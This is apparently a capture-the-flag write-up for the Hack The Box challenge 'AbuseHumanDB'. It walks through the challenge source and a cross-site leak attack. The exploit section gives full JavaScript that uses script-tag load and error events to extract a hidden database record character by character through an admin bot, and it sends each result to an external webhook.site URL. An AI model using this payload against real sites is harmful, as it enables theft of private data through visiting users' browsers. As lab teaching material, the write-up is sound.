---
layout: post
title:  "AbuseHumanDB"
author: "Hack The Box (Itasahobby, Rayhan0x01)"
date:   2022-03-07 23:29:13 +0000
categories: ctf hackthebox web
description: "there is an impostor _____ __"
---
*[Challenge](https://app.hackthebox.com/challenges/abusehumandb), [Source](https://www.hackthebox.com/api/v4/challenge/download/260) (password `hackthebox`)*  

**TL;DR**: The flag is stored in a database and the `/api/entries/search?q=` endpoint allows users to query the database. Only localhost can query records with `approved=0`, and the flag is one such record. Use the report URL function to report a webpage with JavaScript code that repeatedly sends requests to `/api/entries/search?q=`; the response code leaks information about the next character in the flag, and hence when the admin visits that page, the flag can be slowly built up by concatenating characters that elicit a valid response code to the known flag and sending this information to a webhook.  

---  

## Inititation

> We discovered a mysterious web portal that we believe are operated by aliens! Can you find out what they don't want us to see?

Upon visiting the site we are met with a political diatribe against humanity, alongside a place where you can report URLs containing "Abusive Content by Humans". We should want to avoid informing on our fellow humans, but if worst comes to worst, this does seem like a typical admin bot which could be a vector for XSS/SSRF. We'll see if we need it.  

Navigating through the website further, the "Public Entries" tab takes us to a list of different anti-alien pages across the web and a search box to query them by title. We're given the initialising SQL code:  

```sql
PRAGMA case_sensitive_like=ON; 

DROP TABLE IF EXISTS userEntries;

CREATE TABLE IF NOT EXISTS userEntries (
    id          INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
    title       VARCHAR(255) NOT NULL UNIQUE,
    url         VARCHAR(255) NOT NULL,
    approved    BOOLEAN NOT NULL
);

INSERT INTO userEntries (title, url, approved) VALUES ("Back The Hox :: Cyber Catastrophe Propaganda CTF against Aliens", "https://ctf.backthehox.ew/ctf/82", 1);
INSERT INTO userEntries (title, url, approved) VALUES ("Drunk Alien Song | Patlamaya Devam (official video)", "https://www.youtune.com/watch?v=jPPT7TcFmAk", 1);
INSERT INTO userEntries (title, url, approved) VALUES ("Mars Attacks! Earth is invaded by Martians with unbeatable weapons and a cruel sense of humor.", "https://www.imbd.com/title/tt0116996/", 1);
INSERT INTO userEntries (title, url, approved) VALUES ("Professor Steven Rolling fears aliens could ‘plunder, conquer and colonise’ Earth if we contact them", "https://www.thebun.co.uk/tech/4119382/professor-steven-rolling-fears-aliens-could-plunder-conquer-and-colonise-earth-if-we-contact-them/", 1);
INSERT INTO userEntries (title, url, approved) VALUES ("HTB{f4k3_fl4g_f0r_t3st1ng}","https://app.backthehox.ew/users/107", 0);
```  

The flag is stored in this database, but it's the only record with `approved=0`, which seems impossible to get right now: at both the `/api/entries` and `/api/entries/search` endpoints, the database is queried for records that satisfy `approved = isLocalhost(req)`, as below:  

```js
const isLocalhost = req => ((req.ip == '127.0.0.1' && req.headers.host == '127.0.0.1:1337') ? 0 : 1);

router.get('/api/entries', (req, res) => {
	return db.listEntries(isLocalhost(req))
		.then(entries => {
			res.json(entries);
		})
		.catch(() => res.send(response('Something went wrong!')));
});

router.get('/api/entries/search', (req, res) => {
	if(req.query.q) {
		const query = `${req.query.q}%`;
		return db.getEntry(query, isLocalhost(req))
			.then(entries => {
				if(entries.length == 0) return res.status(404).send(response('Your search did not yield any results!'));
				res.json(entries);
			})
			.catch(() => res.send(response('Something went wrong! Please try again!')));
	}
	return res.status(403).json(response('Missing required parameters!'));
});
```

Additionally, all the SQL code seems to be secure, with no glaring injection vulnerabilities. This is looking awfully similar to an SSRF challenge, where we request for the admin bot (instead of us) to visit the `/api/entries` endpoint to bypass the localhost restriction, but how are we going to obtain the contents of that page without violating SOP?  

Hmm. Well, what about the other endpoint, `/api/entries/search`? In the above code, the `/api/entries/search` endpoint actually returns different status codes depending on whether any results are returned from the database or not. For example, it returns a 404 when there are no results returned, and a 200 when there are, and we can actually use these status codes without violating SOP! Looks like we will have to betray our species after all...by informing on ourselves!  

---  

## Exploitation

The 200 and 404 response codes trigger the `onload` and `onerror` event handlers respectively. We can report any webpage to the admins, so why don't we report a webpage that iterates through a list of characters and queries `/api/entries/search?q=` with each character until it finds a 200 status code, distinguishing between invalid and valid characters with these event handlers? We could then append the character to a string containing what we currently know the flag to be and repeat until we build up the flag!  

I was stuck here for quite a bit because my JavaScript skills are quite lacking, so I decided to read this [writeup](https://skelter.hashnode.dev/htb-abusehumandb-writeup) on the same challenge by skelter. My code is largely based on theirs, and it was a great learning experience for me, so if you were as clueless as me in how to implement this then I've added comments to the code to try and help explain. Here it is:  

```js
var url = "http://127.0.0.1:1337/api/entries/search?q=";

/*
String that will always contain what we know is definitely in the flag
HTB{ is our base case as we know this begins the flag
We build from this base case 
*/
var flag = "HTB{";


/* 
Take care with this alphabet, remove "&" and "%" (query params, wildcard)
and put the underscore at the end as it represents a single character wildcard
and so should be checked last as otherwise it will always be appended to the flag
*/
var a = "{}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!$'()*+,-./:;<=>@[]^|_";


// Asynchronous as we wish to wait for this to complete before continuing
// Checks the status code when we query with a specific character
async function check(char) {
    return new Promise((resolve, reject) => {

    	// Create a script tag to query the api endpoint with the character via src attribute
        var s = document.createElement("script");
        s.src = url+flag+char;

        // onload: 200 => resolve (character is the next in the flag)
        s.onload = () => {resolve(char);};

        // onerror: 404 => reject (character is invalid)
        s.onerror = () => {reject(char);};

        document.head.appendChild(s);

    });
}


var i = 0;
async function loop() {
    while (true) {
        char = a[i];
        // Check this character, wait for the result, then depending on its result, do 2 different things:
        await check(char).then((res) => {
        	/*
        	1st: if it was resolved (accepted), append it to the string of known characters
        	that begin the flag and send this to a webhook that we control
        	so that we can get also get this information
        	*/
            flag += res;
            fetch("https://webhook.site/b8857ff4-aecc-4ab0-afae-47be1d91813a?"+flag);

            // Start from the first character again
            i = 0;

        }, (res) => {
        	// 2nd: if it was rejected, move onto the next character
        	i++;

        });
    }
}

loop();
```  

```
Flag: HTB{5w33t_ali3ndr3n_0f_min3!}
```
